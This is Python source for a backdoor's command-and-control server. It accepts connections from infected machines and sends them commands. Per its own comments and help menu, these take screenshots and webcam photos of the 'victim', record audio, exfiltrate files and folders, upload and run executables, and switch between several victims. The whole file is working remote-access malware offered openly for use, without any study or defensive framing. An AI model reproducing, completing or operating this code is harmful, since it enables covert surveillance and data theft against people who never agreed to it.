import os
import sys
import socket
import random
import textwrap
import argparse
import threading
from colorama import  Fore, Style


class BackdoorServer:
    def __init__(self, server_adres, server_port):
        self.server_adres = server_adres
        self.server_port = server_port

        self.sendCommande = None
        self.server_connection = []
        self.write_to_a_file_mode = None
        self.current_connection_with_server = None
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self):
        self.socket.bind((self.server_adres, self.server_port))
        self.socket.listen(100)
        print(Fore.LIGHTCYAN_EX + f"[ * ] Listing server on port {self.server_port}" + Style.RESET_ALL)
        while True:
            try:
                connect, rhost = self.socket.accept()
                print(Fore.LIGHTBLUE_EX+ f"[ * ]Connection from {rhost} on the server" + Style.RESET_ALL)
                self.server_connection.append(connect)
                if len(self.server_connection) == 1:
                    threading.Thread(target=self.startHandler, args=[connect]).start()
            except OSError:
                self.socket.close()
                sys.exit(0)
    def startHandler(self, sock):
        file_name = lambda x: x + str(random.randrange(0, 1000))
        self.current_connection_with_server = sock
        while True:
            get_info_target = BackdoorServer.socket_data(self.current_connection_with_server, "get_info")
            if not get_info_target:
                break
            try:
                self.sendCommande = input(get_info_target.decode() + " :> ")
            except EOFError:
                sys.exit()

            sendCommande_split = self.sendCommande.split(" ")
            dl = " ".join(sendCommande_split[1:])
            del sendCommande_split[1:]
            sendCommande_split.append(dl)

            if self.sendCommande.lower() == "screenshoot":
                '''
                Send a command to take a screenshoot on victim's computer
                '''
                self.write_to_a_file_mode = file_name("screenshoot") + ".bmp"
                print(Fore.LIGHTYELLOW_EX + "[ * ] Screen capture in process..." + Style.RESET_ALL)

            elif self.sendCommande.lower() == "camshoot":
                '''
                Send a command to take a picture on victim's computer
                '''
                self.write_to_a_file_mode = file_name("camshoot") + ".jpg"
                print(Fore.LIGHTYELLOW_EX + "[ * ] Capture a picture in process..." + Style.RESET_ALL)

            elif sendCommande_split[0].lower() == "record":
                '''
                Make an audio recording for x time on the victim's computer    
                '''
                try:
                    int(sendCommande_split[1].strip())
                except:
                    print(Fore.LIGHTRED_EX + "[ ! ] Error while recording" + Style.RESET_ALL)
                    continue
                else:
                    self.write_to_a_file_mode = file_name("record") + ".wav"
                    print(Fore.LIGHTYELLOW_EX + "[ * ] Recording in process..." + Style.RESET_ALL)

            elif sendCommande_split[0].lower() == "download":
                '''
                if args == -f: download a file on victim's computer
                elif args == -d: download a folder on victim's computer
                '''
                match sendCommande_split[1][:2]:
                    case "-d":
                        print(Fore.LIGHTYELLOW_EX + "[ * ] Downloading folder..." + Style.RESET_ALL)
                        self.write_to_a_file_mode = f"{(sendCommande_split[1][2:]).strip()}.zip"
                    case "-f":
                        print(Fore.LIGHTYELLOW_EX + "[ * ] Downloading file..." + Style.RESET_ALL)
                        self.write_to_a_file_mode = (sendCommande_split[1][2:]).strip()
                    case _:
                        print(Fore.LIGHTRED_EX + f"[ ! ] The {sendCommande_split[1][:2]} option is not recognized" + Style.RESET_ALL)
                        continue

            elif sendCommande_split[0].lower() == "upload":
                '''
                Upload a file to the victim's computer
                '''
                if not os.path.isfile(sendCommande_split[1]):
                    print(Fore.LIGHTRED_EX + "[ ! ] You can't upload a folder " + Style.RESET_ALL)
                    continue
                try:
                    print(Fore.LIGHTYELLOW_EX + "[ * ] Uploading..." + Style.RESET_ALL)
                    name = (sendCommande_split[1]).split("\\")[-1]
                    name_length = str(len(name)).zfill(6)
                    upload_file_data = b'xhc-upload-xhc.' + bytes(name_length.encode()) + bytes(name.encode())
                    with open(sendCommande_split[1], "rb") as file:
                        while True:
                            dt = file.read(4096)
                            upload_file_data += dt
                            if not dt:
                                break
                except (FileNotFoundError, PermissionError):
                    print(Fore.LIGHTRED_EX + "[ ! ] The name of the file you want to upload is not found" + Style.RESET_ALL)
                    continue
                else:
                    self.sendCommande = upload_file_data

            elif self.sendCommande.lower() == "show connection":
                '''
                View the list of victims logged on  to the server
                '''
                lines = ""
                for i in range(152):
                    lines += "="
                print(f"\n{lines}")
                print(" Num |\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tSocket Descryption")
                print(lines)

                for number, socket_value in enumerate(self.server_connection):
                    if BackdoorServer.socket_data(socket_value, "try_connecton") == b'WINDOWS':
                        self.server_connection.remove(socket_value)
                        continue
                    else:
                        print(f" [{number+1}] | {sock}")
                print("\n")
                continue

            elif sendCommande_split[0].lower() == "set-connection":
                '''
                Switch the connection from one victim to another
                '''
                try:
                    socket_number = int(sendCommande_split[1]) - 1
                    try_connection = BackdoorServer.socket_data(self.server_connection[socket_number], "try_connection")
                    if try_connection == b'WINDOWS':
                        self.current_connection_with_server.close()
                        self.server_connection.remove(self.server_connection[socket_number])
                        print(Fore.LIGHTRED_EX + "[ ! ] The connection with the specified socket was lost" + Style.RESET_ALL)
                    else:
                        self.current_connection_with_server = self.server_connection[socket_number]
                        print(Fore.LIGHTYELLOW_EX + f"[ * ] Connection successfully redirect to socket number {socket_number+1}" + Style.RESET_ALL)
                except Exception:
                    print(Fore.LIGHTRED_EX + "[ ! ] The specified socket is not connected to the server" + Style.RESET_ALL)
                continue

            elif self.sendCommande.lower() == "--help":
                print("""
                Help Menu:

                [1] --help :> show this message
                [2] screenshoot :> take a screenshoot
                [3] upload + "file name" :> upload a file
                [4] donwload -f + "file name" :> download a file
                [5] donwload -d + "folder name" :> download a folder
                [6] execute + "file name" :> run an executable file
                [7] show connection  :> show all connection on the server
                [8] set-connection + "socket number" :> redirect a connection to the corresponding socket number
                [9] record + "recording time(in seconds)" :> record an audio on the victim's machine
                [10] camShoot :> Take a picture with the camera of the victim machine
                [11] disk_partitions or disk partitions :> show current disk partitions on a target machine
                """)
                continue

            data_received = BackdoorServer.socket_data(self.current_connection_with_server, self.sendCommande)
            if not data_received:
                continue
            elif data_received == b"SERVER_BACKDOOR":
                try:
                    self.server_connection.remove(self.current_connection_with_server)
                except Exception:
                    continue
                else:
                    print(Fore.LIGHTRED_EX + "[ ! ] The connection with the current socket was lost\n[ * ] Write <show connection> to see all connection on the server" + Style.RESET_ALL)
            else:
                if self.write_to_a_file_mode:
                    if len(data_received) == 1 and data_received == b" ":
                        print(Fore.LIGHTRED_EX + "[ * ] Error when downloading, check the options you entered" + Style.RESET_ALL)
                    else:
                        with open(self.write_to_a_file_mode, "wb") as download_file:
                            download_file.write(data_received)
                        print(Fore.LIGHTBLUE_EX + f"[ * ] The file {self.write_to_a_file_mode} has been saved in {os.getcwd()}" + Style.RESET_ALL)
                    self.write_to_a_file_mode = None
                else:
                    self.write_to_a_file_mode = None
                    print(data_received.decode())

        self.current_connection_with_server.close()

    @staticmethod
    def socket_data(sock, command):
        try:
            if not command:
                return " ".encode()
            elif command[:15] != b'xhc-upload-xhc.':
                command = command.encode()
            len_command = len(command)
            command_handshake_size = str(len_command).zfill(13)
            sock.sendall(command_handshake_size.encode())
            sock.sendall(command)
            handShake_length = BackdoorServer.receive_socket_data(sock, 13)
            recv_data = BackdoorServer.receive_socket_data(sock, int(handShake_length.decode()))
            return recv_data
        except (ConnectionResetError, OSError, ConnectionAbortedError, ConnectionError):
            return "SERVER_BACKDOOR".encode()
    @staticmethod
    def receive_socket_data(sock, data_length):
        """
        This method plays the role of the receriver of data from the victims computers
        :param sock: the current socket
        :param data_length:
        :return:
        """
        current_length = 0
        data = b''
        while current_length < data_length:
            chuck_size = data_length - current_length
            if chuck_size > 4096:
                chuck_size = 4096
            received_data = sock.recv(chuck_size)
            if not received_data: return None
            elif not data:
                data = received_data
            else:
                data += received_data
            current_length += len(received_data)
        return data


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="BACKDOOR SERVER TOOL",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            server.py -h 192.168.1.108 -p 5555 # start server handler
            server.py -help # Show this message
        ''')
    )
    parser.add_argument('-lh', '--lhost', dest="host", default='localhost', type=str, help="The server's Ip adress, default='localhost'")
    parser.add_argument('-p', '--port',dest="port", type=int, default=4275, help="The server's port")
    args = parser.parse_args()

    try:
        BackdoorServer(server_adres=args.host, server_port=args.port).run()
    except KeyboardInterrupt:
        pass